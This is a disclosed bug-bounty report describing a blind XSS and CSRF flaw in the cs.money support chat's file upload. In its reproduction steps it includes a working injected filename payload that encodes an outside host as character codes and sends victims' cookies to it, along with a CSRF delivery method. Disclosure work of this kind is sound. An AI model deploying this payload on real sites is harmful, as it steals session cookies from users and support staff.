# Blind XSS on image upload

## Report Details
- **Report ID**: 1010466
- **URL**: https://hackerone.com/reports/1010466
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-10-17T04:17:33.874Z
- **Disclosed**: 2020-12-26T00:08:49.144Z

## Reporter
- **Username**: benjamin-mauss
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: cs_money

## Vulnerability Information
## Summary:
- The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
- The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request. 

## Steps To Reproduce:
XSS
- use a proxy like burp suite and turn intercept on
- upload a file to the support chat
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
- open the chat support and xss will activate

 CSRF
- create a file html in some server
- create a form with a file and the payload name
- send to a new tab. This one will post the image with payload

## Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii      to convert the attacker's website link to ascii

## Impact

Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.

## Attachments
- expected_request.png
- payload.txt
- result.png
